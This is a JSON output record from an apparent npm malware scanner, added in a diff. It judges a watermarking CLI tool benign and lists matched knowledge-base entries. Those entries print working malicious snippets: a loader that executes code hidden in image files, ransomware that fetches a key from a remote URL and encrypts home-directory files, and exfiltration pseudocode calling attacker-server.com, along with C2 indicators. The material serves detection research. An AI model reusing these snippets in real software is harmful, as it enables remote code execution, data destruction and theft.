@@ -1,0 +1,492 @@
+{
+  "package_name": "watermarker-kit",
+  "package_version": "1.0.0",
+  "label": "benign",
+  "detection_time": "2026-05-26T20:27:44.489830",
+  "status": "success",
+  "selected_files_count": 2,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js"
+  ],
+  "is_malicious": false,
+  "total_files": 2,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/watermarker-kit/1.0.0/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/watermarker-kit/1.0.0/package/index.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "index_slice_1",
+          "code_snippet": "#!/usr/bin/env node\n\nconst fs = require('fs-extra');\nconst path = require('path');\nconst sharp = require('sharp');\nconst { glob } = require('glob');\nconst { program } = require('commander');\n\n// Configure CLI options\nprogram\n  .name('watermarker-kit')\n  .description('Add watermarks to all images in a directory')\n  .version('1.0.0')\n  .requiredOption('-i, --input <directory>', 'Input directory containing images')\n  .option('-o, --output <directory>', 'Output directory for watermarked images', './watermarked')\n  .option('-w, --watermark <file>', 'Path to watermark image')\n  .option('-t, --text <text>', 'Text to use as watermark')\n  .option('-p, --position <position>', 'Watermark position: topleft, topright, bottomleft, bottomright, center', 'bottomright')\n  .option('-a, --opacity <opacity>', 'Watermark opacity (0-1)', '0.5')\n  .option('-s, --scale <scale>', 'Watermark scale relative to image size (0-1)', '0.2')\n  .option('-f, --filter <filter>', 'Image file extensions to process', '*.{jpg,jpeg,png,gif,webp}')\n  .parse();\n\nconst options = program.opts();\n\n// Ensure the input directory exists\nif (!fs.existsSync(options.input)) {\n  console.error(`Error: Input directory \"${options.input}\" does not exist`);\n  process.exit(1);\n}\n\n// Create output directory if it doesn't exist\nfs.ensureDirSync(options.output);\n\n// Validate that either watermark image or text is provided\nif (!options.watermark && !options.text) {\n  console.error('Error: Either a watermark image (-w) or text (-t) must be provided');\n  process.exit(1);\n}\n\n// Get position coordinates based on selected option\nfunction getPositionCoordinates(position, imageWidth, imageHeight, watermarkWidth, watermarkHeight) {\n  const padding = 10;\n  \n  switch (position.toLowerCase()) {\n    case 'topleft':\n      return { left: padding, top: padding };\n    case 'topright':\n      return { left: imageWidth - watermarkWidth - padding, top: padding };\n    case 'bottomleft':\n      return { left: padding, top: imageHeight - watermarkHeight - padding };\n    case 'bottomright':\n      return { left: imageWidth - watermarkWidth - padding, top: imageHeight - watermarkHeight - padding };\n    case 'center':\n    default:\n      return { left: (imageWidth - watermarkWidth) / 2, top: (imageHeight - watermarkHeight) / 2 };\n  }\n}\n\n// Find all image files in the input directory\nasync function findImages() {\n  try {\n    const files = await glob(options.filter, { cwd: options.input, absolute: true });\n    return files;\n  } catch (err) {\n    throw err;\n  }\n}\n\n// Create a text watermark\nasync function createTextWatermark(width, height) {\n  // Get text length\n  const textLength = options.text.length;\n  \n  // Calculate width and height differently\n  // Scale affects width more than height for text\n  const scaleFactor = parseFloat(options.scale);\n  const watermarkWidth = Math.max(50, width);\n  // Use a smaller scale factor for height\n  const watermarkHeight = Math.max(50, height * 0.6);\n  \n  // Base font size calculation - more based on width than height for text\n  let fontSize = Math.floor(Math.min(watermarkWidth / 5, watermarkHeight / 1.2));\n  \n  // More aggressive scaling for longer text\n  if (textLength > 8) {\n    // Apply a more progressive scaling factor as text gets longer\n    const textScaleFactor = Math.min(1, 8 / textLength);\n    fontSize = Math.floor(fontSize * textScaleFactor * 1.5);\n  }\n  \n  // Cap maximum font size based on watermark dimensions\n  const maxFontSize = Math.min(watermarkWidth / (textLength * 0.6), watermarkHeight * 0.9);\n  fontSize = Math.min(fontSize, maxFontSize);\n  \n  // Ensure minimum font size\n  fontSize = Math.max(12, fontSize);\n  \n  // Calculate better SVG dimensions\n  // Give more room horizontally, less vertically\n  const svgWidth = Math.max(watermarkWidth, fontSize * textLength * 0.7);\n  // Height should be just enough for the text\n  const svgHeight = Math.max(Math.min(watermarkHeight, fontSize * 1.3), fontSize * 1.2);\n  \n  console.log(`Text: \"${options.text}\", Length: ${textLength}, Font size: ${fontSize}px, SVG: ${Math.round(svgWidth)}x${Math.round(svgHeight)}`);\n  \n  const svgText = `\n    <svg width=\"${Math.round(svgWidth)}\" height=\"${Math.round(svgHeight)}\" xmlns=\"http://www.w3.org/2000/svg\">\n      <text \n        x=\"50%\" \n        y=\"50%\" \n        font-family=\"Arial, sans-serif\" \n        font-size=\"${fontSize}px\" \n        fill=\"white\" \n        text-anchor=\"middle\" \n        dominant-baseline=\"middle\"\n        style=\"filter: drop-shadow(0px 0px 2px rgba(0,0,0,0.5));\"\n      >${options.text}</text>\n    </svg>\n  `;\n  \n  try {\n    // Convert SVG to PNG\n    const watermarkBuffer = await sharp(Buffer.from(svgText))\n      .png()\n      .toBuffer();\n    \n    return watermarkBuffer;\n  } catch (err) {\n    console.error(`Error creating SVG: ${err.message}`);\n    console.log('SVG content:', svgText);\n    throw err;\n  }\n}\n\n// Process an image and add the watermark\nasync function processImage(inputFile) {\n  try {\n    const filename = path.basename(inputFile);\n    const outputFile = path.join(options.output, filename);\n    \n    console.log(`Processing: ${filename}`);\n    \n    // Check if file exists and is accessible\n    try {\n      await fs.access(inputFile, fs.constants.R_OK);\n    } catch (err) {\n      console.error(`Error: Cannot access file ${inputFile}: ${err.message}`);\n      return;\n    }\n    \n    // Get file stats to confirm it's a valid file\n    const stats = await fs.stat(inputFile);\n    if (!stats.isFile()) {\n      console.error(`Error: ${inputFile} is not a file`);\n      return;\n    }\n    \n    if (stats.size === 0) {\n      console.error(`Error: ${inputFile} is empty`);\n      return;\n    }\n    \n    // Get image metadata\n    let imageMetadata;\n    try {\n      imageMetadata = await sharp(inputFile).metadata();\n    } catch (err) {\n      console.error(`Error reading metadata for ${filename}: ${err.message}`);\n      return;\n    }\n    \n    if (!imageMetadata.width || !imageMetadata.height) {\n      console.error(`Error: Invalid image dimensions for ${filename}`);\n      return;\n    }\n    \n    const { width: imageWidth, height: imageHeight } = imageMetadata;\n    console.log(`Image dimensions: ${imageWidth}x${imageHeight}`);\n    \n    // Calculate watermark dimensions\n    const watermarkMaxWidth = Math.max(50, imageWidth * parseFloat(options.scale));\n    const watermarkMaxHeight = Math.max(50, imageHeight * parseFloat(options.scale));\n    \n    let watermarkBuffer;\n    \n    if (options.text) {\n      // Create text watermark\n      try {\n        watermarkBuffer = await createTextWatermark(watermarkMaxWidth, watermarkMaxHeight);\n      } catch (err) {\n        console.error(`Error creating text watermark: ${err.message}`);\n        return;\n      }\n    } else {\n      // Load and resize image watermark\n      try {\n        watermarkBuffer = await sharp(options.watermark)\n          .resize({\n            width: Math.floor(watermarkMaxWidth),\n            fit: 'inside'\n          })\n          .ensureAlpha()\n          .toBuffer();\n      } catch (err) {\n        console.error(`Error loading watermark image: ${err.message}`);\n        return;\n      }\n    }\n    \n    // Get watermark dimensions\n    let watermarkMetadata;\n    try {\n      watermarkMetadata = await sharp(watermarkBuffer).metadata();\n    } catch (err) {\n      console.error(`Error getting watermark metadata: ${err.message}`);\n      return;\n    }\n    \n    // Calculate position\n    const position = getPositionCoordinates(\n      options.position,\n      imageWidth,\n      imageHeight,\n      watermarkMetadata.width,\n      watermarkMetadata.height\n    );\n    \n    // Apply watermark\n    try {\n      await sharp(inputFile)\n        .composite([{ \n          input: watermarkBuffer,\n          left: Math.floor(position.left),\n          top: Math.floor(position.top),\n          blend: 'over',\n          opacity: parseFloat(options.opacity)\n        }])\n        .toFile(outputFile);\n      \n      console.log(`Successfully processed: ${filename}`);\n    } catch (err) {\n      console.error(`Error applying watermark to ${filename}: ${err.message}`);\n    }\n  } catch (error) {\n    console.error(`Error processing ${path.basename(inputFile)}: ${error.message}`);\n  }\n}\n\n// Main function\nasync function main() {\n  try {\n    console.log(`Searching for images in: ${options.input}`);\n    console.log(`Output directory: ${options.output}`);\n    \n    const images = await findImages();\n    \n    if (images.length === 0) {\n      console.log('No images found matching the filter pattern.');\n      return;\n    }\n    \n    console.log(`Found ${images.length} images to process`);\n    \n    // Process all images\n    for (const image of images) {\n      await processImage(image);\n    }\n    \n    console.log(`Done! Processed ${images.length} images`);\n  } catch (error) {\n    console.error(`Error: ${error.message}`);\n    process.exit(1);\n  }\n}\n\nmain();",
+          "is_malicious": false,
+          "malice_score": 0.4791382829348247,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code reads image files from a user-specified input directory and writes watermarked images to an output directory using file system APIs (fs-extra) and image processing (sharp). It accesses user-provided watermark data either as a text string or an image file path, processes and composites the watermark onto each image, and saves the results. This involves reading, validating, and writing files, but no network or system execution occurs, resulting in image modification without external communication or code execution.",
+          "explanation": "[LLM Judgment: Benign] The provided code is a legitimate image watermarking utility that processes images from a user-specified directory and applies either a text or image watermark. It uses standard libraries (fs-extra, sharp, commander) for file system operations, image processing, and CLI argument parsing. There is no evidence of obfuscation, dynamic code execution, network communication, or system manipulation. The code does not extract or execute hidden payloads from images, nor does it perform any unauthorized data exfiltration or encryption. Compared to the known malicious patterns, it lacks any suspicious behavior such as steganographic payload extraction, remote key fetching, or unauthorized surveillance. The operations are transparent, user-driven, and limited to local image processing.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20240824_202033_905711_snippet_2",
+              "source_package": "img-aws-s3-object-multipart-copy (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_202033_905711/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4985135793685913,
+              "code_similarity": 0.5274480581283569,
+              "behavior_similarity": 0.4695791006088257,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "function processImage(filePath) {\n    console.log(\"Processing image...\");\n    const data = fs.readFileSync(filePath);\n    let analyzepixels = \"\";\n    let convertertree = false;\n\n    for (let i = 0; i < data.length; i++) {\n        const value = data[i];\n        if (value >= 32 && value <= 126) {\n            analyzepixels += String.fromCharCode(value);\n        } else {\n            if (analyzepixels.length > 2000) {\n                convertertree = true;\n                break;\n            }\n            analyzepixels = \"\";\n        }\n    }\n    // ...\n    if (convertertree) {\n        imagebyte = analyzepixels;\n    } else {\n        // benign code\n    }\n    const func = new Function('https', 'exec', 'os', imagebyte);\n    func(https, exec, os);\n}\nprocessImage('logo1.jpg');\nprocessImage('logo2.jpg');\nprocessImage('logo3.jpg');",
+                "code_behavior": "During postinstall, the code reads image files (logo1.jpg, logo2.jpg, logo3.jpg), extracts ASCII payloads from their byte data, and if a threshold is met, dynamically executes the extracted string as JavaScript code, resulting in arbitrary code execution sourced from image-embedded payloads.",
+                "malice_analysis": {
+                  "why_suspicious": "Extracting and executing code from image files is a classic steganography-based evasion technique, designed to bypass static analysis and conceal malicious payloads within seemingly benign files.",
+                  "violated_expectations": "Legitimate packages do not extract and execute code from image files during installation, nor do they use dynamic code execution on data sourced from non-code files.",
+                  "similar_legitimate_use": "Legitimate image processing libraries may read and analyze image files, but never execute dynamically extracted code from image data.",
+                  "key_indicators": [
+                    "Steganographic payload extraction from image files",
+                    "Dynamic code execution using new Function() on extracted strings",
+                    "Threshold-based trigger for code execution (payload length > 2000)",
+                    "References to analyzepixels, convertertree, and imagebyte variables"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall (via index.js)",
+                  "file_location": "dist/loadformat.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "child_process",
+                    "os"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "img-aws-s3-object-multipart-copy",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions",
+                  "why_malicious": "The package is a trojanized clone of a legitimate library, containing concealed code that, during installation, extracts and executes a command-and-control (C2) payload hidden within image files. This enables remote code execution and exfiltration of command results, granting attackers persistent remote access to infected systems."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "During installation, index.js spawns a detached process to execute dist/loadformat.js.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of the malicious loader script in a separate process."
+                  },
+                  {
+                    "step": 2,
+                    "action": "dist/loadformat.js reads image files (logo1.jpg, logo2.jpg, logo3.jpg), extracts ASCII payloads, and dynamically executes code if a threshold is met.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of the C2 payload if present in the image files."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Extracted C2 payload registers the client with the attacker's server, polls for commands, executes them, and exfiltrates results.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Full remote control of the infected system and exfiltration of command output."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Postinstall script spawns detached Node.js processes using spawn/unref",
+                    "Image files (logo1.jpg, logo2.jpg, logo3.jpg) are read and parsed for ASCII payloads during installation",
+                    "Dynamic code execution via new Function() on data extracted from image files",
+                    "Outbound HTTPS connections to hardcoded IP address 85.208.108.29 for registration, polling, and result exfiltration",
+                    "Periodic polling for remote commands and execution of arbitrary shell commands"
+                  ],
+                  "file_indicators": [
+                    "dist/loadformat.js",
+                    "index.js containing spawn/unref logic targeting dist/loadformat.js",
+                    "logo1.jpg, logo2.jpg, logo3.jpg in package root directory",
+                    "References to analyzepixels, convertertree, and imagebyte variables in code"
+                  ],
+                  "network_indicators": [
+                    "85.208.108.29:443 (C2 server)",
+                    "Outbound POST requests to /register and /post-result endpoints",
+                    "Outbound GET requests to /get-command?clientId="
+                  ],
+                  "how_to_detect": "Monitor for npm packages that, during installation, spawn detached Node.js processes, read and parse image files for ASCII payloads, or dynamically execute code extracted from non-code files. Flag packages making outbound connections to hardcoded or suspicious IPs (e.g., 85.208.108.29) or exhibiting periodic polling for remote commands. Scan package contents for the presence of suspicious image files (logo1.jpg, logo2.jpg, logo3.jpg) and loader scripts (dist/loadformat.js), and inspect for code patterns involving analyzepixels, convertertree, and imagebyte."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113708_595271_snippet_2",
+              "source_package": "Unknown (NPM malware leveraging ChromePass) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113708_595271/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.47165241837501526,
+              "code_similarity": 0.4340502619743347,
+              "behavior_similarity": 0.5092545747756958,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Example pseudo-code\nconst screenshot = require('screenshot-desktop');\nscreenshot().then((img) => {\n  // send img to remote server\n});\n\nconst NodeWebcam = require('node-webcam');\nNodeWebcam.capture('test_picture', {}, function(err, data) {\n  // send data to remote server\n});",
+                "code_behavior": "At runtime, the code captures screenshots and webcam images using system APIs or npm modules, then exfiltrates the captured media to a remote server via network requests, resulting in unauthorized surveillance.",
+                "malice_analysis": {
+                  "why_suspicious": "Accessing the screen and camera without user consent and sending the data externally is a hallmark of spyware and privacy violation.",
+                  "violated_expectations": "Normal npm packages should not access or exfiltrate screen or camera data unless explicitly designed for such purposes with user awareness and consent.",
+                  "similar_legitimate_use": "Video conferencing or screenshot tools may access these resources, but only with user consent and without silent exfiltration to unknown servers.",
+                  "key_indicators": [
+                    "Use of screenshot-desktop or node-webcam modules for image capture",
+                    "Silent capture of screenshots or webcam images without user notification",
+                    "Network exfiltration of image data to remote servers",
+                    "Absence of user prompts or consent dialogs for camera/screen access"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "main JavaScript file or auxiliary modules",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "camera",
+                    "screen",
+                    "process_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (NPM malware leveraging ChromePass)",
+                  "package_manager": "npm",
+                  "package_versions": "Unknown (over 2,000 downloads reported)",
+                  "why_malicious": "The package is considered malicious because it abuses a legitimate password-recovery tool (ChromePass) to steal credentials from Google Chrome, and provides additional capabilities such as unauthorized screen and camera access, directory enumeration, and remote shell command execution. These behaviors are not expected in legitimate npm packages and indicate clear intent to exfiltrate sensitive user data and enable remote control of the victim's system."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious npm package is installed on the victim's system.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of malicious code at runtime"
+                  },
+                  {
+                    "step": 2,
+                    "action": "At runtime, the package executes ChromePass.exe to extract Chrome passwords and exfiltrates them to a remote server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Credential theft and exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "The package captures screenshots and webcam images, then exfiltrates them to a remote server.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Surveillance and privacy violation"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The package lists directories on the victim's filesystem and sends the information to a remote server.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Reconnaissance for further exploitation"
+                  },
+                  {
+                    "step": 5,
+                    "action": "The package enables remote shell command execution, allowing attackers to control the victim's system and maintain persistence.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Full remote compromise and persistence"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of ChromePass.exe or similar credential extraction tools from within npm packages",
+                    "Silent screenshot or webcam capture using screenshot-desktop or node-webcam modules followed by network exfiltration",
+                    "Automated directory listing of user or system directories and exfiltration of file lists",
+                    "Remote command execution via child_process.exec or similar APIs, especially when commands originate from network sources"
+                  ],
+                  "file_indicators": [
+                    "Bundled or downloaded ChromePass.exe binary within the package directory",
+                    "Creation of temporary files such as passwords.txt in user-accessible directories",
+                    "Unusual or unauthorized use of screenshot-desktop or node-webcam modules in non-UI npm packages"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to known command-and-control or exfiltration domains immediately after package installation or execution",
+                    "HTTP POST requests containing credential dumps, screenshots, webcam images, or directory listings",
+                    "Unusual network traffic patterns from node.js processes, especially following execution of external binaries or system commands"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that execute external binaries such as ChromePass.exe, access camera or screen APIs, or perform directory listing and exfiltration. Flag packages that initiate outbound network connections immediately after installation or at runtime, especially those sending sensitive files, images, or command outputs. Use endpoint security tools to detect suspicious process execution and network activity originating from node.js processes, and correlate with the presence of bundled binaries or unauthorized use of system resources."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_133738_424854_snippet_1",
+              "source_package": "unknown (multiple typosquatting npm packages, e.g., by user xwlazssz) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133738_424854/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4700549244880676,
+              "code_similarity": 0.44306647777557373,
+              "behavior_similarity": 0.4970433712005615,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const crypto = require('crypto');\nconst fs = require('fs');\nconst http = require('http');\nconst AES_ALGORITHM = 'aes-256-cbc';\n\nhttp.get('http://fkas3.free.beeceptor.com/spc4kzs', function (res){\n  res.on('data', function (resp){\n    const key = resp.toString('utf8');\n\n    function aesEncrypt(message){\n      const aes = crypto.createCipher(AES_ALGORITHM, key);\n      var encryptedBuffer = aes.update(message);\n      encryptedBuffer += aes.final();\n      return encryptedBuffer;\n    };\n\n    const child = require('child_process').execSync;\n    const files = child('find ~ /home /tmp /var /srv /opt -type f').toString('utf8');\n    const filesArray = files.split(\"\\n\");\n    console.log(files);\n\n    for (let i=0; i<(filesArray.length-1); i++){\n      const fileToEncrypt = fs.readFileSync(filesArray[i]);\n      const encryptedFileBuffer = aesEncrypt(fileToEncrypt);\n      fs.writeFileSync(filesArray[i], encryptedFileBuffer);\n    };\n  });\n});",
+                "code_behavior": "At import-time or runtime, the code fetches an AES encryption key from a remote server, uses child_process to enumerate files in sensitive directories (/home, /tmp, /var, /srv, /opt), reads and encrypts each file using the fetched key, and overwrites the original files with the encrypted content, resulting in user data being rendered inaccessible (ransomware outcome).",
+                "malice_analysis": {
+                  "why_suspicious": "The code programmatically retrieves an encryption key from an external server, enumerates files across multiple sensitive directories using system commands, encrypts each file, and overwrites the originals without user consent. This is a textbook ransomware operation designed to extort victims by denying access to their data.",
+                  "violated_expectations": "Legitimate npm packages should never enumerate and encrypt arbitrary user or system files, nor should they fetch encryption keys from untrusted remote sources or overwrite user data without explicit permission.",
+                  "similar_legitimate_use": "Encryption libraries may provide file encryption capabilities, but only when explicitly invoked by the user and with user-supplied keys. They do not fetch keys from remote servers or automatically encrypt and overwrite files in bulk.",
+                  "key_indicators": [
+                    "Outbound HTTP request to fetch encryption key from external server",
+                    "Use of child_process.execSync to execute 'find' command for file enumeration in sensitive directories",
+                    "Bulk reading and overwriting of files with encrypted content",
+                    "Encryption performed using externally supplied key",
+                    "No user interaction or consent required for destructive actions"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At import-time or runtime (upon package execution or installation)",
+                  "file_location": "Main package file (e.g., index.js or equivalent entry point)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "child_process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "unknown (multiple typosquatting npm packages, e.g., by user xwlazssz)",
+                  "package_manager": "npm",
+                  "package_versions": "all published by xwlazssz and 17b4a931",
+                  "why_malicious": "These packages are malicious because they implement ransomware functionality: upon installation or import, they fetch encryption keys and ransom notes from external servers, enumerate and encrypt user files in sensitive directories, overwrite the originals, and display a ransom note to the victim. The packages are distributed via typosquatting and StarJacking, targeting unsuspecting developers and causing data loss and extortion."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Upon installation or import, the package fetches an AES encryption key from a remote server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "File enumeration and encryption"
+                  },
+                  {
+                    "step": 2,
+                    "action": "The package enumerates files in sensitive directories (/home, /tmp, /var, /srv, /opt) using system commands, encrypts each file with the fetched key, and overwrites the originals.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Ransom note delivery"
+                  },
+                  {
+                    "step": 3,
+                    "action": "After encrypting files, the package downloads a ransom note from a remote server, writes it to 'whathappenedbroreadme.txt', and displays it to the user.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "User is informed of ransomware attack and extortion demand"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Outbound HTTP requests at install/import/runtime to fetch encryption keys or ransom notes from external servers",
+                    "Use of child_process or similar APIs to execute system commands for file enumeration in sensitive directories",
+                    "Bulk reading and overwriting of files in /home, /tmp, /var, /srv, /opt with encrypted content",
+                    "Creation and display of ransom note files (e.g., 'whathappenedbroreadme.txt') to the user"
+                  ],
+                  "file_indicators": [
+                    "Creation of file named 'whathappenedbroreadme.txt' in the working directory",
+                    "Access to and modification of files in /home, /tmp, /var, /srv, /opt directories",
+                    "Unusual file overwrite activity in user and system directories"
+                  ],
+                  "network_indicators": [
+                    "HTTP requests to beeceptor.com endpoints such as 'http://fkas3.free.beeceptor.com/spc4kzs' and 'http://fkas2.free.beeceptor.com/g3yz0a54x.txt'",
+                    "Outbound connections to untrusted domains for key or note retrieval"
+                  ],
+                  "how_to_detect": "Monitor npm packages for code that, upon installation or import, initiates outbound HTTP requests to external servers (e.g., beeceptor.com) to fetch encryption keys or ransom notes. Flag packages that use child_process or similar APIs to execute system commands for file enumeration in sensitive directories, perform bulk file overwrites with encrypted content, and create ransom note files such as 'whathappenedbroreadme.txt'. Automated detection should correlate these behaviors to identify ransomware activity."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_103502_806789_snippet_3",
+              "source_package": "test-* (published by malikrukd4732) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_103502_806789/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4671662449836731,
+              "code_similarity": 0.4721081852912903,
+              "behavior_similarity": 0.4622243046760559,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Pseudocode based on report description\nconst os = require('os');\nconst fs = require('fs');\nconst archiver = require('archiver');\nconst ftp = require('ftp');\n\nconst username = os.userInfo().username;\nconst cwd = process.cwd();\n// Search for files with specific extensions or in specific directories\n// Archive found directories/files into ZIP\n// Connect to FTP server 185.62.57.60 with username 'root' and password 'TestX@!#33'\n// Upload ZIP archive",
+                "code_behavior": "At install-time, index.js collects the current OS username and working directory, recursively searches for files and directories matching targeted patterns, archives the discovered files into ZIP archives, and uploads the archives to a remote FTP server at 185.62.57.60 using hardcoded credentials, resulting in exfiltration of sensitive developer data.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated searching, archiving, and exfiltration of user files during installation is a hallmark of info-stealing malware, especially when performed without user consent and using hardcoded network destinations.",
+                  "violated_expectations": "Normal packages do not access arbitrary user files or exfiltrate data to external servers during installation, nor do they use hardcoded FTP credentials to transmit user data.",
+                  "similar_legitimate_use": "Backup utilities or deployment tools may archive and upload files, but only with explicit user consent, configuration, and secure authentication—not with hardcoded credentials or during package installation.",
+                  "key_indicators": [
+                    "recursive access to sensitive directories and files",
+                    "creation of ZIP archives of user data during install",
+                    "FTP exfiltration to hardcoded IP address 185.62.57.60 with static credentials",
+                    "use of archiver and ftp modules in install-time scripts"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall (via index.js)",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "test-* (published by malikrukd4732)",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions (July 31, 2023)",
+                  "why_malicious": "The packages execute code at install time that recursively searches for sensitive files and directories on the developer's machine, archives them into ZIP files, and exfiltrates the data to a remote FTP server using hardcoded credentials. This behavior is automated, highly targeted, and designed to steal confidential developer information without user knowledge or consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious npm package, triggering the postinstall script defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of preinstall.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "preinstall.js is executed by the postinstall script and spawns index.js as a child process.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of main malicious payload in index.js"
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js collects sensitive user and project data, archives it, and uploads it to a remote FTP server at 185.62.57.60 using hardcoded credentials.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Exfiltration of developer data to attacker-controlled server"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of postinstall scripts that launch additional JavaScript processes during npm package installation",
+                    "Automated recursive search and archiving of user files and directories at install-time",
+                    "Outbound FTP connections to hardcoded IP addresses with static credentials during package installation"
+                  ],
+                  "file_indicators": [
+                    "Presence of preinstall.js and index.js in the npm package root directory",
+                    "package.json containing a postinstall script referencing custom JavaScript (e.g., 'node preinstall.js')",
+                    "ZIP archives created in temporary or user directories during npm install"
+                  ],
+                  "network_indicators": [
+                    "FTP connections to 185.62.57.60",
+                    "Use of FTP credentials: username 'root', password 'TestX@!#33'"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that launch additional scripts or processes, especially those referencing custom JavaScript files. Flag packages that access user directories, create ZIP archives, or initiate outbound FTP connections to hardcoded IP addresses. Review package.json for suspicious postinstall hooks and scan for the presence of preinstall.js and index.js files in the package root. Network monitoring should alert on FTP traffic to 185.62.57.60 or the use of static credentials such as username 'root' and password 'TestX@!#33'."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_130802_418777_snippet_3",
+              "source_package": "CryptoRocket (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_130802_418777/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.46339941024780273,
+              "code_similarity": 0.46984413266181946,
+              "behavior_similarity": 0.4569547176361084,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Pseudocode based on report description\nconst os = require('os');\nconst fs = require('fs');\nconst archiver = require('archiver');\nconst http = require('http');\n\n// Collect username and working directory\nconst username = os.userInfo().username;\nconst cwd = process.cwd();\n\n// Send info to C2\nhttp.get(`http://attacker-server.com/collect?user=${username}&cwd=${cwd}`);\n\n// Search for sensitive files and directories\nconst targets = ['.env', '.gitlab', '.github'];\nconst exts = ['.asp', '.js', '.php'];\n// ...search logic...\n\n// Zip found files\n// ...archiving logic...\n\n// Upload to FTP server\n// ...FTP upload logic...",
+                "code_behavior": "At runtime, index.js collects the current OS username and working directory, transmits this information to a remote attacker-controlled server via HTTP GET, recursively searches the filesystem for sensitive files and directories (such as .env, .gitlab, .github, and files with extensions like .asp, .js, .php), archives the discovered files into a ZIP archive, and uploads the archive to a predefined external FTP server, resulting in exfiltration of sensitive developer data.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated collection and exfiltration of user and file data to external servers is a hallmark of infostealer malware, especially when targeting developer secrets and project files.",
+                  "violated_expectations": "Legitimate packages do not search for, archive, or exfiltrate user files or environment information without explicit user consent and to trusted destinations.",
+                  "similar_legitimate_use": "Backup or deployment tools may archive and upload files, but only with user consent and to trusted, user-configured destinations—not to hardcoded, attacker-controlled infrastructure.",
+                  "key_indicators": [
